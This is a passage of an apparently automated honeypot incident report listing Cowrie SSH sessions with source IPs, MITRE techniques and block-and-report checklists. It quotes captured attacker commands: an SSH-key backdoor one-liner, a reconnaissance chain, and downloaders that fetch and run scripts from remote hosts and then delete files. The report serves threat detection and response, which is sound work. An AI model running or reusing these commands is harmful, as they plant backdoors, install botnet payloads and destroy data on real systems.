- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8ef1d245df3

| Field | Detail |
|---|---|
| **Source IP** | `82.77.62[.]250` |
| **First Seen** | 2026-09-19 17:45 |
| **Last Seen** | 2026-09-19 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:45:55` | `cowrie.session.connect` |
| `2026-09-19 17:45:55` | `cowrie.client.version` |
| `2026-09-19 17:45:55` | `cowrie.client.kex` |
| `2026-09-19 17:45:55` | `cowrie.login.success` |
| `2026-09-19 17:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.77.62[.]250` to AbuseIPDB if not already reported
- [ ] Block `82.77.62[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f1889aa187

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-09-19 17:48 |
| **Last Seen** | 2026-09-19 17:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:48:15` | `cowrie.session.connect` |
| `2026-09-19 17:48:15` | `cowrie.client.version` |
| `2026-09-19 17:48:15` | `cowrie.client.kex` |
| `2026-09-19 17:48:16` | `cowrie.login.success` |
| `2026-09-19 17:48:17` | `cowrie.session.params` |
| `2026-09-19 17:48:17` | `cowrie.command.input` |
| `2026-09-19 17:48:17` | `cowrie.command.failed` |
| `2026-09-19 17:48:17` | `cowrie.log.closed` |
| `2026-09-19 17:48:18` | `cowrie.session.params` |
| `2026-09-19 17:48:18` | `cowrie.command.input` |
| `2026-09-19 17:48:18` | `cowrie.session.file_download` |
| `2026-09-19 17:48:18` | `cowrie.log.closed` |
| `2026-09-19 17:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-439fa9085c31

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-09-19 17:48 |
| **Last Seen** | 2026-09-19 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:48:18` | `cowrie.session.connect` |
| `2026-09-19 17:48:18` | `cowrie.client.version` |
| `2026-09-19 17:48:19` | `cowrie.client.kex` |
| `2026-09-19 17:48:19` | `cowrie.login.success` |
| `2026-09-19 17:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81df105017cb

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-09-19 17:48 |
| **Last Seen** | 2026-09-19 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:48:20` | `cowrie.session.connect` |
| `2026-09-19 17:48:20` | `cowrie.client.version` |
| `2026-09-19 17:48:20` | `cowrie.client.kex` |
| `2026-09-19 17:48:21` | `cowrie.login.success` |
| `2026-09-19 17:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dedb72296571

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-19 17:57 |
| **Last Seen** | 2026-09-19 17:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:57:27` | `cowrie.session.connect` |
| `2026-09-19 17:57:27` | `cowrie.client.version` |
| `2026-09-19 17:57:27` | `cowrie.client.kex` |
| `2026-09-19 17:57:29` | `cowrie.login.success` |
| `2026-09-19 17:57:31` | `cowrie.session.params` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.success` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.command.input` |
| `2026-09-19 17:57:31` | `cowrie.log.closed` |
| `2026-09-19 17:57:33` | `cowrie.session.params` |
| `2026-09-19 17:57:33` | `cowrie.command.input` |
| `2026-09-19 17:57:34` | `cowrie.log.closed` |
| `2026-09-19 17:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-01852a3a46c0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-19 17:59 |
| **Last Seen** | 2026-09-19 17:59 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:59:13` | `cowrie.session.connect` |
| `2026-09-19 17:59:13` | `cowrie.login.success` |
| `2026-09-19 17:59:14` | `cowrie.session.params` |
| `2026-09-19 17:59:15` | `cowrie.command.input` |
| `2026-09-19 17:59:15` | `cowrie.command.input` |
| `2026-09-19 17:59:15` | `cowrie.session.file_download` |
| `2026-09-19 17:59:15` | `cowrie.session.file_download` |
| `2026-09-19 17:59:16` | `cowrie.session.file_download` |
| `2026-09-19 17:59:16` | `cowrie.session.file_download` |
| `2026-09-19 17:59:16` | `cowrie.session.file_download.failed` |
| `2026-09-19 17:59:16` | `cowrie.session.file_download` |
| `2026-09-19 17:59:16` | `cowrie.session.file_download` |
| `2026-09-19 17:59:30` | `cowrie.log.closed` |
| `2026-09-19 17:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a01d91a0d583

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-19 17:59 |
| **Last Seen** | 2026-09-19 17:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:59:23` | `cowrie.session.connect` |
| `2026-09-19 17:59:23` | `cowrie.client.version` |
| `2026-09-19 17:59:23` | `cowrie.client.kex` |
| `2026-09-19 17:59:25` | `cowrie.login.success` |
| `2026-09-19 17:59:26` | `cowrie.session.params` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:26` | `cowrie.command.success` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:26` | `cowrie.command.input` |
| `2026-09-19 17:59:27` | `cowrie.command.input` |
| `2026-09-19 17:59:27` | `cowrie.command.input` |
| `2026-09-19 17:59:27` | `cowrie.log.closed` |
| `2026-09-19 17:59:28` | `cowrie.session.params` |
| `2026-09-19 17:59:28` | `cowrie.command.input` |
| `2026-09-19 17:59:28` | `cowrie.log.closed` |
| `2026-09-19 17:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d4ee469daf

| Field | Detail |
|---|---|
| **Source IP** | `23.94.206[.]233` |
| **First Seen** | 2026-09-19 18:07 |
| **Last Seen** | 2026-09-19 18:07 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:07:19` | `cowrie.session.connect` |
| `2026-09-19 18:07:19` | `cowrie.login.success` |
| `2026-09-19 18:07:19` | `cowrie.session.params` |
| `2026-09-19 18:07:21` | `cowrie.command.input` |
| `2026-09-19 18:07:21` | `cowrie.command.input` |
| `2026-09-19 18:07:21` | `cowrie.session.file_download` |
| `2026-09-19 18:07:21` | `cowrie.session.file_download` |
| `2026-09-19 18:07:21` | `cowrie.session.file_download` |
| `2026-09-19 18:07:22` | `cowrie.session.file_download` |
| `2026-09-19 18:07:22` | `cowrie.session.file_download.failed` |
| `2026-09-19 18:07:22` | `cowrie.session.file_download` |
| `2026-09-19 18:07:22` | `cowrie.session.file_download` |
| `2026-09-19 18:07:36` | `cowrie.log.closed` |
| `2026-09-19 18:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.94.206[.]233` to AbuseIPDB if not already reported
- [ ] Block `23.94.206[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d71c2f431b9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-19 18:11 |
| **Last Seen** | 2026-09-19 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:11:11` | `cowrie.session.connect` |
| `2026-09-19 18:11:11` | `cowrie.client.version` |
| `2026-09-19 18:11:11` | `cowrie.client.kex` |
| `2026-09-19 18:11:11` | `cowrie.login.success` |
| `2026-09-19 18:11:11` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:11:11` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36cafba3a3f2

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-09-19 18:20 |
| **Last Seen** | 2026-09-19 18:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:20:56` | `cowrie.session.connect` |
| `2026-09-19 18:20:57` | `cowrie.login.success` |
| `2026-09-19 18:20:57` | `cowrie.session.params` |
| `2026-09-19 18:20:57` | `cowrie.command.input` |
| `2026-09-19 18:20:57` | `cowrie.command.failed` |
| `2026-09-19 18:20:57` | `cowrie.command.input` |
| `2026-09-19 18:20:57` | `cowrie.command.failed` |
| `2026-09-19 18:20:57` | `cowrie.command.input` |
| `2026-09-19 18:20:57` | `cowrie.command.failed` |
| `2026-09-19 18:20:58` | `cowrie.command.input` |
| `2026-09-19 18:20:58` | `cowrie.command.input` |
| `2026-09-19 18:20:58` | `cowrie.command.input` |
| `2026-09-19 18:20:58` | `cowrie.session.file_download` |
| `2026-09-19 18:20:58` | `cowrie.session.file_download` |
| `2026-09-19 18:20:58` | `cowrie.session.file_download` |
| `2026-09-19 18:20:58` | `cowrie.session.file_download.failed` |
| `2026-09-19 18:21:02` | `cowrie.log.closed` |
| `2026-09-19 18:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5cf3da9286

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-09-19 18:20 |
| **Last Seen** | 2026-09-19 18:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:20:58` | `cowrie.session.connect` |
| `2026-09-19 18:20:58` | `cowrie.login.success` |
| `2026-09-19 18:20:58` | `cowrie.session.params` |
| `2026-09-19 18:20:59` | `cowrie.command.input` |
| `2026-09-19 18:20:59` | `cowrie.session.file_download` |
| `2026-09-19 18:20:59` | `cowrie.session.file_download` |
| `2026-09-19 18:20:59` | `cowrie.session.file_download` |
| `2026-09-19 18:20:59` | `cowrie.session.file_download.failed` |
| `2026-09-19 18:21:02` | `cowrie.log.closed` |
| `2026-09-19 18:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0661c4ed89ab

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-09-19 18:25 |
| **Last Seen** | 2026-09-19 18:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:25:19` | `cowrie.session.connect` |
| `2026-09-19 18:25:19` | `cowrie.client.version` |
| `2026-09-19 18:25:19` | `cowrie.client.kex` |
| `2026-09-19 18:25:19` | `cowrie.login.success` |
| `2026-09-19 18:25:20` | `cowrie.session.params` |
| `2026-09-19 18:25:20` | `cowrie.command.input` |
| `2026-09-19 18:25:20` | `cowrie.command.failed` |
| `2026-09-19 18:25:20` | `cowrie.log.closed` |
| `2026-09-19 18:25:21` | `cowrie.session.params` |
| `2026-09-19 18:25:21` | `cowrie.command.input` |
| `2026-09-19 18:25:21` | `cowrie.session.file_download` |
| `2026-09-19 18:25:21` | `cowrie.log.closed` |
| `2026-09-19 18:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0ff6adbd5b

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-09-19 18:25 |
| **Last Seen** | 2026-09-19 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:25:21` | `cowrie.session.connect` |
| `2026-09-19 18:25:21` | `cowrie.client.version` |
| `2026-09-19 18:25:21` | `cowrie.client.kex` |
| `2026-09-19 18:25:21` | `cowrie.login.success` |
| `2026-09-19 18:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b30eb5d9f5

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-09-19 18:25 |
| **Last Seen** | 2026-09-19 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:25:22` | `cowrie.session.connect` |
| `2026-09-19 18:25:22` | `cowrie.client.version` |
| `2026-09-19 18:25:22` | `cowrie.client.kex` |
| `2026-09-19 18:25:22` | `cowrie.login.success` |
| `2026-09-19 18:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45972fb6be7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-19 18:31 |
| **Last Seen** | 2026-09-19 18:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:31:03` | `cowrie.session.connect` |
| `2026-09-19 18:31:03` | `cowrie.client.version` |
| `2026-09-19 18:31:03` | `cowrie.client.kex` |
| `2026-09-19 18:31:03` | `cowrie.login.success` |
| `2026-09-19 18:31:05` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:31:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:31:06` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:31:08` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:31:10` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:31:10` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:31:10` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:31:14` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:31:14` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30eda0e9060

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-19 18:33 |
| **Last Seen** | 2026-09-19 18:33 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:33:20` | `cowrie.session.connect` |
| `2026-09-19 18:33:20` | `cowrie.client.version` |
| `2026-09-19 18:33:20` | `cowrie.client.kex` |
| `2026-09-19 18:33:21` | `cowrie.login.success` |
| `2026-09-19 18:33:28` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:33:33` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:33:33` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:33:38` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:33:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:33:43` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:33:45` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:33:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:33:48` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ee4555548a

| Field | Detail |
|---|---|
| **Source IP** | `61.155.106[.]101` |
| **First Seen** | 2026-09-19 18:34 |
| **Last Seen** | 2026-09-19 18:39 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
